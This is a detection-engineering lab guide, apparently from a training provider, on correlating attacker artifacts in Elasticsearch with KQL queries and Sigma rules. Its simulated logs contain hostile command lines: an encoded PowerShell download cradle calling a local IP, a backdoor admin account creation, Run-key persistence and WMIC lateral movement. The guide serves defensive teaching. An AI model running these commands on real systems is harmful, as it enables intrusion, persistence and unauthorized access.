<div align="center">

# 🧩 Correlate Attacker Execution Artifacts with KQL + Sigma

![Elasticsearch](https://img.shields.io/badge/Elasticsearch-8.11.0-005571?style=for-the-badge&logo=elasticsearch&logoColor=white)
![Kibana](https://img.shields.io/badge/Kibana-KQL-005571?style=for-the-badge&logo=kibana&logoColor=white)
![Sigma](https://img.shields.io/badge/Sigma-Rules-orange?style=for-the-badge&logo=yaml&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?style=for-the-badge&logo=docker&logoColor=white)
![Python](https://img.shields.io/badge/Python-3.x-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Advanced-red?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Threat%20Detection-blue?style=for-the-badge)

**A hands-on lab in correlating attacker execution artifacts using KQL queries and Sigma rules**

</div>

---

## 📑 Table of Contents

- [🎯 Objectives](#-objectives)
- [📋 Prerequisites](#-prerequisites)
- [🖥️ Lab Environment](#️-lab-environment)
- [🔧 Task 1: Deploy Detection Infrastructure](#-task-1-deploy-detection-infrastructure)
- [📥 Task 2: Ingest Attack Simulation Data](#-task-2-ingest-attack-simulation-data)
- [🔍 Task 3: Write KQL Queries for Threat Detection](#-task-3-write-kql-queries-for-threat-detection)
- [📜 Task 4: Implement Sigma Rules for Detection](#-task-4-implement-sigma-rules-for-detection)
- [🔗 Task 5: Correlate Attack Chain](#-task-5-correlate-attack-chain)
- [🎯 Expected Outcomes](#-expected-outcomes)
- [🗺️ MITRE ATT&CK Mapping](#️-mitre-attck-mapping)
- [🛠️ Troubleshooting](#️-troubleshooting)
- [✅ Conclusion](#-conclusion)

---

## 🎯 Objectives

| # | Objective |
|---|-----------|
| 1 | Deploy a log analysis environment using Elasticsearch and Kibana |
| 2 | Write KQL queries to identify malicious process execution patterns |
| 3 | Convert Sigma rules to KQL for threat detection |
| 4 | Correlate multiple attack artifacts to reconstruct attack chains |
| 5 | Analyze encoded PowerShell commands and suspicious network activity |

## 📋 Prerequisites

| Requirement | Details |
|---|---|
| 🐧 Linux CLI | Basic Linux command line proficiency |
| 📄 JSON | Understanding of JSON data structures |
| 📊 Security Logs | Familiarity with security log concepts |
| 🦠 Attack Techniques | Knowledge of common attack techniques (command obfuscation, lateral movement) |

## 🖥️ Lab Environment

> Al Nafi provides a bare-metal Linux cloud machine. Click **Start Lab** to access your environment. You will install Docker, Elasticsearch, Kibana, and Python tools during the lab exercises.

---

## 🔧 Task 1: Deploy Detection Infrastructure

### ✅ Step 1.1: Install Core Dependencies

```bash
# 📦 Update system and install Docker
sudo apt update && sudo apt upgrade -y
sudo apt install -y docker.io docker-compose python3-pip git curl jq

# ▶️ Start Docker service
sudo systemctl start docker
sudo systemctl enable docker
sudo usermod -aG docker $USER

# 🐍 Install Python packages for Sigma
pip3 install pysigma pysigma-backend-kusto pyyaml

# 🔄 Apply group changes
newgrp docker
# TODO: Confirm `docker ps` runs without requiring sudo after the group change
```

### ✅ Step 1.2: Deploy ELK Stack

```bash
# 📁 Create project directory
mkdir ~/attack-correlation-lab && cd ~/attack-correlation-lab

# ⚙️ Create docker-compose configuration
cat > docker-compose.yml << 'EOF'
version: '3.8'
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.11.0
    container_name: elasticsearch
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - "ES_JAVA_OPTS=-Xms512m -Xmx512m"
    ports:
      - "9200:9200"
    volumes:
      - es_data:/usr/share/elasticsearch/data

  kibana:
    image: docker.elastic.co/kibana/kibana:8.11.0
    container_name: kibana
    ports:
      - "5601:5601"
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    depends_on:
      - elasticsearch

volumes:
  es_data:
EOF

# ▶️ Start services
docker-compose up -d

# ⏱️ Wait for initialization (60 seconds)
echo "Waiting for services to start..."
sleep 60
# TODO: Confirm both containers report "healthy" status before proceeding
```

### ✅ Step 1.3: Verify Deployment

```bash
# 🔎 Check container status
docker ps

# 🩺 Test Elasticsearch
curl -X GET "localhost:9200/_cluster/health?pretty"

# ✔️ Expected output: status should be "green" or "yellow"
```

---

## 📥 Task 2: Ingest Attack Simulation Data

### ✅ Step 2.1: Create Simulated Attack Logs

```bash
# 📝 Generate attack scenario logs
cat > attack_logs.json << 'EOF'
{"timestamp":"2024-01-15T10:30:00Z","event_type":"process_creation","process_name":"powershell.exe","command_line":"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA","parent_process":"cmd.exe","user":"SYSTEM","host":"workstation-01"}
{"timestamp":"2024-01-15T10:30:15Z","event_type":"network_connection","process_name":"powershell.exe","destination_ip":"192.168.1.100","destination_port":80,"protocol":"tcp","host":"workstation-01"}
{"timestamp":"2024-01-15T10:30:30Z","event_type":"file_creation","file_path":"C:\\Windows\\Temp\\payload.exe","process_name":"powershell.exe","file_size":73802,"host":"workstation-01"}
{"timestamp":"2024-01-15T10:31:00Z","event_type":"process_creation","process_name":"payload.exe","command_line":"C:\\Windows\\Temp\\payload.exe -connect 192.168.1.100:443","parent_process":"powershell.exe","user":"SYSTEM","host":"workstation-01"}
{"timestamp":"2024-01-15T10:31:05Z","event_type":"network_connection","process_name":"payload.exe","destination_ip":"192.168.1.100","destination_port":443,"protocol":"tcp","host":"workstation-01"}
{"timestamp":"2024-01-15T10:32:00Z","event_type":"process_creation","process_name":"net.exe","command_line":"net user backdoor P@ssw0rd123 /add","parent_process":"payload.exe","user":"SYSTEM","host":"workstation-01"}
{"timestamp":"2024-01-15T10:32:15Z","event_type":"process_creation","process_name":"net.exe","command_line":"net localgroup administrators backdoor /add","parent_process":"payload.exe","user":"SYSTEM","host":"workstation-01"}
{"timestamp":"2024-01-15T10:33:00Z","event_type":"registry_modification","registry_path":"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater","registry_value":"C:\\Windows\\Temp\\payload.exe","process_name":"reg.exe","host":"workstation-01"}
{"timestamp":"2024-01-15T10:34:00Z","event_type":"process_creation","process_name":"wmic.exe","command_line":"wmic /node:192.168.1.50 process call create \"cmd.exe /c powershell.exe\"","parent_process":"payload.exe","user":"SYSTEM","host":"workstation-01"}
{"timestamp":"2024-01-15T10:34:30Z","event_type":"network_connection","process_name":"wmic.exe","destination_ip":"192.168.1.50","destination_port":135,"protocol":"tcp","host":"workstation-01"}
EOF
# TODO: Note each stage represented here (execution → C2 → persistence → lateral movement)
```

### ✅ Step 2.2: Create Index and Ingest Data

```bash
# 🗂️ Create index with mapping
curl -X PUT "localhost:9200/attack-logs" -H 'Content-Type: application/json' -d'
{
  "mappings": {
    "properties": {
      "timestamp": {"type": "date"},
      "event_type": {"type": "keyword"},
      "process_name": {"type": "keyword"},
      "command_line": {"type": "text"},
      "destination_ip": {"type": "ip"},
      "destination_port": {"type": "integer"},
      "host": {"type": "keyword"}
    }
  }
}'

# 📥 Ingest logs using bulk API
cat attack_logs.json | while read line; do
  curl -X POST "localhost:9200/attack-logs/_doc" -H 'Content-Type: application/json' -d "$line"
done

# 🔄 Refresh index
curl -X POST "localhost:9200/attack-logs/_refresh"
```

### ✅ Step 2.3: Verify Data Ingestion

```bash
# 🔢 Check document count
curl -X GET "localhost:9200/attack-logs/_count?pretty"

# 👀 View sample documents
curl -X GET "localhost:9200/attack-logs/_search?pretty&size=2"
# TODO: Confirm the document count matches the 10 events created in Step 2.1
```

---

## 🔍 Task 3: Write KQL Queries for Threat Detection

Access Kibana at `http://localhost:5601`, navigate to **Dev Tools**, and execute these queries:

### ✅ Step 3.1: Detect Encoded PowerShell Commands

```json
// 🔍 Query 1: Find encoded PowerShell execution
GET attack-logs/_search
{
  "query": {
    "bool": {
      "must": [
        {"match": {"process_name": "powershell.exe"}},
        {"wildcard": {"command_line": "*-enc*"}}
      ]
    }
  }
}
```

**Analysis Task:** Decode the Base64 command line parameter to understand the attacker's actions.

```bash
# 🔓 Decode the encoded command (extract from query results)
echo "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA" | base64 -d
# TODO: Note the destination IP and payload filename revealed in the decoded string
```

### ✅ Step 3.2: Correlate Process Creation with Network Activity

```json
// 🔗 Query 2: Find processes with subsequent network connections
GET attack-logs/_search
{
  "query": {
    "bool": {
      "should": [
        {"term": {"event_type": "process_creation"}},
        {"term": {"event_type": "network_connection"}}
      ]
    }
  },
  "sort": [{"timestamp": "asc"}],
  "size": 20
}
```

### ✅ Step 3.3: Identify Lateral Movement Attempts

```json
// ↔️ Query 3: Detect WMIC remote execution
GET attack-logs/_search
{
  "query": {
    "bool": {
      "must": [
        {"match": {"process_name": "wmic.exe"}},
        {"wildcard": {"command_line": "*process call create*"}}
      ]
    }
  }
}
```

### ✅ Step 3.4: Find Persistence Mechanisms

```json
// 🧷 Query 4: Registry Run key modifications
GET attack-logs/_search
{
  "query": {
    "bool": {
      "must": [
        {"term": {"event_type": "registry_modification"}},
        {"wildcard": {"registry_path": "*CurrentVersion\\Run*"}}
      ]
    }
  }
}
# TODO: Cross-reference the modifying process (reg.exe) against its parent process
```

---

## 📜 Task 4: Implement Sigma Rules for Detection

### ✅ Step 4.1: Create Sigma Rule for Encoded PowerShell

```bash
# 📁 Create Sigma rules directory
mkdir -p ~/attack-correlation-lab/sigma-rules
cd ~/attack-correlation-lab/sigma-rules
```

```yaml
# 📜 encoded_powershell.yml — detects encoded PowerShell execution
title: Encoded PowerShell Command Execution
id: 12345678-1234-1234-1234-123456789abc
status: experimental
description: Detects execution of PowerShell with encoded commands
author: Security Lab
date: 2024/01/15
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    process_name: 'powershell.exe'
    command_line|contains:
      - '-enc'
      - '-encodedcommand'
  condition: selection
falsepositives:
  - Legitimate administrative scripts
level: high
tags:
  - attack.execution
  - attack.t1059.001
```

### ✅ Step 4.2: Create Sigma Rule for Lateral Movement

```yaml
# 📜 wmic_lateral_movement.yml — detects WMIC remote process creation
title: WMIC Remote Process Execution
id: 23456789-2345-2345-2345-234567890abc
status: experimental
description: Detects lateral movement via WMIC remote process creation
author: Security Lab
date: 2024/01/15
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    process_name: 'wmic.exe'
    command_line|contains:
      - '/node:'
      - 'process call create'
  condition: selection
falsepositives:
  - Remote system administration
level: high
tags:
  - attack.lateral_movement
  - attack.t1047
```

### ✅ Step 4.3: Convert Sigma Rules to KQL

Create a Python script to convert Sigma rules:

```python
#!/usr/bin/env python3
"""
Sigma to KQL Converter

TODO: Complete the implementation to convert Sigma rules to KQL queries
"""

from sigma.collection import SigmaCollection
from sigma.backends.kusto import KustoBackend
import yaml
import sys

def load_sigma_rule(rule_path):
    """
    Load a Sigma rule from YAML file.

    Args:
        rule_path: Path to Sigma rule file

    Returns:
        Loaded Sigma rule object

    TODO: Implement file reading and YAML parsing
    TODO: Handle file not found errors
    """
    pass

def convert_to_kql(sigma_rule):
    """
    Convert Sigma rule to KQL query.

    Args:
        sigma_rule: Sigma rule object

    Returns:
        KQL query string

    TODO: Initialize KustoBackend
    TODO: Convert rule using backend
    TODO: Return formatted KQL query
    """
    pass

def main():
    """
    Main function to process Sigma rules.

    TODO: Parse command line arguments
    TODO: Load each Sigma rule file
    TODO: Convert to KQL and print results
    """
    if len(sys.argv) < 2:
        print("Usage: python3 sigma_to_kql.py <sigma_rule.yml>")
        sys.exit(1)

    # TODO: Implement conversion logic
    pass

if __name__ == "__main__":
    main()
```

```bash
# 🔑 Save as sigma_to_kql.py and make executable
chmod +x sigma_to_kql.py
```

### ✅ Step 4.4: Test Sigma Rule Conversion

```bash
# 🔄 Convert Sigma rules to KQL
python3 sigma_to_kql.py encoded_powershell.yml
python3 sigma_to_kql.py wmic_lateral_movement.yml

# ✔️ Expected output: KQL queries that can be used in Kibana
# TODO: Complete the load_sigma_rule() and convert_to_kql() functions above before running
```

---

## 🔗 Task 5: Correlate Attack Chain

### ✅ Step 5.1: Build Attack Timeline

Create a Python script to correlate events:

```python
#!/usr/bin/env python3
"""
Attack Chain Correlator

Analyzes logs to reconstruct complete attack sequences.
"""

import requests
import json
from datetime import datetime

ES_URL = "http://localhost:9200"
INDEX = "attack-logs"

def fetch_all_events():
    """
    Retrieve all events from Elasticsearch.

    Returns:
        List of event documents sorted by timestamp

    TODO: Make GET request to Elasticsearch
    TODO: Parse JSON response
    TODO: Sort events by timestamp
    TODO: Return list of events
    """
    pass

def group_by_process():
    """
    Group events by process name to identify chains.

    Returns:
        Dictionary mapping process names to their events

    TODO: Fetch all events
    TODO: Create dictionary grouped by process_name
    TODO: Return grouped events
    """
    pass

def identify_attack_stages(events):
    """
    Classify events into attack stages (initial access, execution, persistence, etc.).

    Args:
        events: List of event documents

    Returns:
        Dictionary mapping attack stages to events

    TODO: Define attack stage patterns
    TODO: Classify each event into appropriate stage
    TODO: Return categorized events
    """
    pass

def generate_timeline_report(events):
    """
    Generate human-readable attack timeline.

    Args:
        events: List of event documents

    TODO: Format events chronologically
    TODO: Add descriptions for each event
    TODO: Print formatted timeline
    """
    pass

def main():
    """
    Main correlation function.

    TODO: Fetch events from Elasticsearch
    TODO: Identify attack stages
    TODO: Generate and display timeline
    """
    print("=== Attack Chain Correlation ===\n")

    # TODO: Implement correlation logic
    pass

if __name__ == "__main__":
    main()
```

```bash
# ▶️ Save as correlate_attack.py and execute
python3 correlate_attack.py
```

### ✅ Step 5.2: Analyze Attack Patterns

Document your findings by answering these questions:

| # | Question |
|---|---|
| 1 | 🚪 **Initial Access**: How did the attacker gain initial execution? |
| 2 | ⚙️ **Execution**: What techniques were used to run malicious code? |
| 3 | 🧷 **Persistence**: How did the attacker maintain access? |
| 4 | ↔️ **Lateral Movement**: What methods were used to spread? |
| 5 | 📡 **Command and Control**: What network indicators exist? |

### ✅ Step 5.3: Create Detection Dashboard

In Kibana (`http://localhost:5601`):

1. Navigate to **Dashboard → Create dashboard**
2. Add visualizations:
   - **Process Creation Timeline**: Line chart of `process_creation` events
   - **Network Connections Map**: Table of destination IPs and ports
   - **Top Suspicious Processes**: Bar chart of process names
   - **Attack Stage Distribution**: Pie chart of event types
3. Save dashboard as **"Attack Correlation Dashboard"**

---

## 🎯 Expected Outcomes

After completing this lab, you should have:

- ✅ Functional ELK stack for log analysis
- ✅ Collection of KQL queries detecting specific attack techniques
- ✅ Converted Sigma rules for automated threat detection
- ✅ Python scripts for attack chain correlation
- ✅ Understanding of how to reconstruct attack sequences from logs
- ✅ Kibana dashboard visualizing attack patterns

---

## 🗺️ MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic | Lab Reference |
|---|---|---|---|
| T1059.001 | PowerShell | Execution | Encoded PowerShell detection (Sigma + KQL) |
| T1027 | Obfuscated Files or Information | Defense Evasion | Base64-encoded command line |
| T1105 | Ingress Tool Transfer | Command and Control | `payload.exe` download / network connection |
| T1136 | Create Account | Persistence | `net user backdoor ... /add` |
| T1098 | Account Manipulation | Privilege Escalation | `net localgroup administrators backdoor /add` |
| T1547.001 | Registry Run Keys | Persistence | `CurrentVersion\Run` registry modification |
| T1047 | Windows Management Instrumentation | Lateral Movement | WMIC remote process creation Sigma rule |

---

## 🛠️ Troubleshooting

<details>
<summary>❗ Issue: Elasticsearch fails to start</summary>

**Solution:** Check available memory with `free -h`. Elasticsearch requires at least 2GB RAM. Reduce heap size in `docker-compose.yml` if needed.

</details>

<details>
<summary>❗ Issue: Cannot connect to Kibana</summary>

**Solution:** Verify Elasticsearch is healthy first: `curl localhost:9200/_cluster/health`. Wait 2-3 minutes after starting containers.

</details>

<details>
<summary>❗ Issue: No data appears in queries</summary>

**Solution:** Verify index exists: `curl localhost:9200/_cat/indices`. Check document count: `curl localhost:9200/attack-logs/_count`. Re-run ingestion if count is 0.

</details>

<details>
<summary>❗ Issue: Sigma conversion fails</summary>

**Solution:** Ensure pysigma packages are installed: `pip3 install pysigma pysigma-backend-kusto`. Check Sigma rule YAML syntax.

</details>

<details>
<summary>❗ Issue: Base64 decode produces garbled output</summary>

**Solution:** PowerShell uses UTF-16LE encoding. Use: `echo "<base64>" | base64 -d | iconv -f UTF-16LE -t UTF-8`

</details>

---

## ✅ Conclusion

This lab demonstrated practical threat detection using KQL queries and Sigma rules. You deployed a log analysis environment, ingested simulated attack data, and correlated multiple artifacts to reconstruct complete attack chains. These skills are essential for security analysts investigating real-world incidents.

**Key takeaways:**

- 🔍 KQL provides powerful query capabilities for log analysis
- 📜 Sigma rules enable portable, standardized threat detection
- 🔗 Attack correlation requires understanding temporal relationships between events
- 🕵️ Encoded commands and obfuscation are common attacker techniques
- 📊 Multiple data sources must be combined to see the complete picture

Continue practicing by creating additional Sigma rules for other MITRE ATT&CK techniques and expanding your detection capabilities.

---

<div align="center">

### 🛡️ Al Nafi Cloud Labs
*Empowering the Next Generation of Cybersecurity Professionals*

![Al Nafi](https://img.shields.io/badge/Al%20Nafi-Cloud%20Security%20Labs-1a1a2e?style=for-the-badge)

</div>
